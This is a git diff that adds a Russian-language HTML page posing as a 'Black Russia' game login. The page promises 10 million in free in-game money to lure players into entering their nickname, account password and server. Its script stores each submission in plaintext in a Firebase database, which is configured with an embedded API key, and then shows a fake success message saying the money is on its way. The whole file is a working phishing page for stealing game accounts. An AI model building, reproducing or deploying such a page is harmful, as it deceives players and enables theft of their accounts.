@@ -1,1 +1,416 @@
-# BlackDistribution
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Black Russia Clone - Авторизация</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: linear-gradient(135deg, #12161a, #1a222d);
+            color: #ffffff;
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Стиль матового стекла (Liquid Glass) */
+        .glass-container {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 30px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            text-align: center;
+        }
+
+        /* Текст сверху, который ты можешь легко изменить */
+        .promo-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #e0e6ed;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .promo-subtitle {
+            font-size: 14px;
+            color: #38bdf8; /* Мягкий голубой акцент вместо неона/красного */
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #94a3b8;
+            margin-bottom: 6px;
+            padding-left: 4px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-field:focus {
+            border-color: #38bdf8;
+        }
+
+        /* Кнопки в стиле интерфейса игры */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #2563eb;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: #1d4ed8;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #e2e8f0;
+            margin-bottom: 15px;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.12);
+        }
+
+        /* Выбор сервера */
+        #menu {
+            display: none;
+            margin-top: -5px;
+            margin-bottom: 15px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        select {
+            width: 100%;
+            padding: 12px;
+            background: #1e293b;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+        }
+
+        #selected {
+            margin: 10px 0 15px 0;
+            font-size: 14px;
+            color: #34d399; /* Приятный зеленый для успешного выбора */
+            font-weight: 500;
+        }
+
+        /* Кастомное модальное окно уведомления */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(5px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #1e293b;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 25px;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            animation: scaleUp 0.25s ease;
+        }
+
+        .modal-content h3 {
+            color: #34d399;
+            margin-bottom: 12px;
+            font-size: 18px;
+        }
+
+        .modal-content p {
+            font-size: 14px;
+            color: #cbd5e1;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes scaleUp {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glass-container">
+        <div class="promo-title">Хочешь получить 10кк на свой аккаунт?</div>
+        <div class="promo-subtitle">Зарегистрируйся прямо сейчас и получи 10кк бесплатно!</div>
+
+        <form id="accountForm" onsubmit="submitForm(event)">
+            
+            <div class="input-group">
+                <label for="username">Игровой ник (английскими буквами)</label>
+                <input type="text" id="username" class="input-field" placeholder="Пример: Ivan_Ivanov" required pattern="[A-Za-z0-9_@ ]+">
+            </div>
+
+            <div class="input-group">
+                <label for="password">Пароль от аккаунта</label>
+                <input type="password" id="password" class="input-field" placeholder="Введите ваш пароль" required pattern="[A-Za-z0-9_@]+">
+            </div>
+
+            <button type="button" class="btn btn-secondary" onclick="openMenu()">Выбрать сервер</button>
+
+            <div id="menu">
+                <select id="serverSelect" onchange="saveServer()" required>
+                    <option value="">-- Выберите сервер --</option>
+                    <option>RED [1]</option>
+                    <option>GREEN [2]</option>
+                    <option>BLUE [3]</option>
+                    <option>YELLOW [4]</option>
+                    <option>ORANGE [5]</option>
+                    <option>PURPLE [6]</option>
+                    <option>LIME [7]</option>
+                    <option>PINK [8]</option>
+                    <option>CHERRY [9]</option>
+                    <option>BLACK [10]</option>
+                    <option>INDIGO [11]</option>
+                    <option>WHITE [12]</option>
+                    <option>MAGENTA [13]</option>
+                    <option>CRIMSON [14]</option>
+                    <option>GOLD [15]</option>
+                    <option>AZURE [16]</option>
+                    <option>PLATINUM [17]</option>
+                    <option>AQUA [18]</option>
+                    <option>GRAY [19]</option>
+                    <option>ICE [20]</option>
+                    <option>CHILLI [21]</option>
+                    <option>CHOCO [22]</option>
+                    <option>MOSCOW [23]</option>
+                    <option>SPB [24]</option>
+                    <option>UFA [25]</option>
+                    <option>SOCHI [26]</option>
+                    <option>KAZAN [27]</option>
+                    <option>SAMARA [28]</option>
+                    <option>ROSTOV [29]</option>
+                    <option>ANAPA [30]</option>
+                    <option>EKB [31]</option>
+                    <option>KRASNODAR [32]</option>
+                    <option>ARZAMAS [33]</option>
+                    <option>NOVOSIBIRSK [34]</option>
+                    <option>GROZNY [35]</option>
+                    <option>SARATOV [36]</option>
+                    <option>OMSK [37]</option>
+                    <option>IRKUTSK [38]</option>
+                    <option>VOLGOGRAD [39]</option>
+                    <option>VORONEZH [40]</option>
+                    <option>BELGOROD [41]</option>
+                    <option>MAKHACHKALA [42]</option>
+                    <option>VLADIKAVKAZ [43]</option>
+                    <option>VLADIVOSTOK [44]</option>
+                    <option>KALININGRAD [45]</option>
+                    <option>CHELYABINSK [46]</option>
+                    <option>KRASNOYARSK [47]</option>
+                    <option>CHEBOKSARY [48]</option>
+                    <option>KHABAROVSK [49]</option>
+                    <option>PERM [50]</option>
+                    <option>TULA [51]</option>
+                    <option>RYAZAN [52]</option>
+                    <option>MURMANSK [53]</option>
+                    <option>PENZA [54]</option>
+                    <option>KURSK [55]</option>
+                    <option>ARKHANGELSK [56]</option>
+                    <option>ORENBURG [57]</option>
+                    <option>KIROV [58]</option>
+                    <option>KEMEROVO [59]</option>
+                    <option>TYUMEN [60]</option>
+                    <option>TOLYATTI [61]</option>
+                    <option>IVANOVO [62]</option>
+                    <option>STAVROPOL [63]</option>
+                    <option>SMOLENSK [64]</option>
+                    <option>PSKOV [65]</option>
+                    <option>BRYANSK [66]</option>
+                    <option>OREL [67]</option>
+                    <option>YAROSLAVL [68]</option>
+                    <option>BARNAUL [69]</option>
+                    <option>LIPETSK [70]</option>
+                    <option>ULYANOVSK [71]</option>
+                    <option>YAKUTSK [72]</option>
+                    <option>TAMBOV [73]</option>
+                    <option>BRATSK [74]</option>
+                    <option>ASTRAKHAN [75]</option>
+                    <option>CHITA [76]</option>
+                    <option>KOSTROMA [77]</option>
+                    <option>VLADIMIR [78]</option>
+                    <option>KALUGA [79]</option>
+                    <option>N.NOVGOROD [80]</option>
+                    <option>TAGANROG [81]</option>
+                    <option>VOLOGDA [82]</option>
+                    <option>TVER [83]</option>
+                    <option>TOMSK [84]</option>
+                    <option>IZHEVSK [85]</option>
+                    <option>SURGUT [86]</option>
+                    <option>PODOLSK [87]</option>
+                    <option>MAGADAN [88]</option>
+                    <option>CHEREPOVETS [89]</option>
+                    <option>NORILSK [90]</option>
+                    <option>ASTANA [91]</option>
+                </select>
+            </div>
+
+            <div id="selected"></div>
+
+            <button type="submit" class="btn">Зарегистрироваться</button>
+        </form>
+    </div>
+
+    <div id="successModal" class="modal-overlay">
+        <div class="modal-content">
+            <h3>Успешная регистрация!</h3>
+            <p>Заявка принята. Игровые деньги (10.000.000 рублей) поступают на ваш указанный аккаунт в течении 1 дня.</p>
+            <button class="btn" onclick="closeModal()">Отлично</button>
+        </div>
+    </div>
+
+    <script>
+        // Конфиг Firebase, который ты предоставил
+        const firebaseConfig = {
+            apiKey: "AIzaSyCHjsiC8jC1AVkCvMmDXK7_fVKm6StpUtw",
+            authDomain: "beaschat-e0a28.firebaseapp.com",
+            projectId: "beaschat-e0a28",
+            storageBucket: "beaschat-e0a28.firebasestorage.app",
+            messagingSenderId: "906515573172",
+            appId: "1:906515573172:web:ee23ac70264e7a18d36ae1",
+            measurementId: "G-XLVW2SYHPM",
+            databaseURL: "https://beaschat-e0a28-default-rtdb.europe-west1.firebasedatabase.app"
+        };
+
+        // Инициализация Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Функции управления меню серверов
+        function openMenu(){
+            document.getElementById("menu").style.display = "block";
+        }
+
+        function saveServer(){
+            let server = document.getElementById("serverSelect").value;
+            localStorage.setItem("selectedServer", server);
+            
+            if(server) {
+                document.getElementById("selected").innerHTML = "Выбран сервер: " + server;
+            } else {
+                document.getElementById("selected").innerHTML = "";
+            }
+        }
+
+        // Загрузка сохраненного сервера при открытии страницы
+        window.onload = function(){
+            let saved = localStorage.getItem("selectedServer");
+            if(saved){
+                document.getElementById("serverSelect").value = saved;
+                document.getElementById("selected").innerHTML = "Выбран сервер: " + saved;
+            }
+        }
+
+        // Функция отправки формы и сохранения данных по НИКУ игрока
+        function submitForm(event) {
+            event.preventDefault();
+
+            let rawUsername = document.getElementById("username").value.trim();
+            let passwordVal = document.getElementById("password").value;
+            let serverVal = document.getElementById("serverSelect").value;
+
+            if(!serverVal) {
+                alert("Пожалуйста, выберите сервер!");
+                return;
+            }
+
+            // Форматируем ник: убираем лишние пробелы внутри и заменяем их на "_", чтобы путь в БД был правильным
+            let usernameVal = rawUsername.replace(/\s+/g, '_');
+
+            // Сохраняем в Firebase по пути: users/Имя_Игрока
+            // Таким образом, в панели Firebase не будет случайных букв-ключей, а будут понятные папки с никами
+            database.ref('users/' + usernameVal).set({
+                username: usernameVal,
+                password: passwordVal,
+                server: serverVal,
+                date: new Date().toLocaleString()
+            })
+            .then(() => {
+                // Если данные записались успешно — сбрасываем форму и открываем окно
+                document.getElementById("accountForm").reset();
+                document.getElementById("selected").innerHTML = "";
+                localStorage.removeItem("selectedServer");
+                
+                document.getElementById("successModal").style.display = "flex";
+            })
+            .catch((error) => {
+                console.error("Ошибка сохранения:", error);
+                alert("Произошла ошибка при отправке данных. Попробуйте еще раз.");
+            });
+        }
+
+        // Закрытие модального окна
+        function closeModal() {
+            document.getElementById("successModal").style.display = "none";
+        }
+    </script>
+</body>
+</html>
